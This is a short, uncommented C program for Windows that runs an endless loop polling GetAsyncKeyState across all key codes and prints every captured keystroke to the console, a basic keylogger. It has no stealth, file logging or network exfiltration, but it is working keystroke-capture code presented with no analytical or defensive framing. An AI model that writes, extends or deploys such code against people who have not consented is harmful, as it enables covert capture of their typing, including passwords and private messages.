#include<windows.h>
#include<stdio.h>

int main()
{ while(1)
	{for(int i=0; i<256; i++)
		{
		if(GetAsyncKeyState(i)==-32767)
		{
			switch(i)
			{
			case VK_DELETE:
			printf("<delete>");
			break;
			
			case VK_BACK:
			printf("<back>");
			break;
			
			case VK_SPACE:
			printf("<space>");
			break;
			
			case VK_RETURN:
			printf("\n");
			break;
			
			default:
			printf("%c",i);
			break;
			
			}
		
		}
		
		}
	}	
}
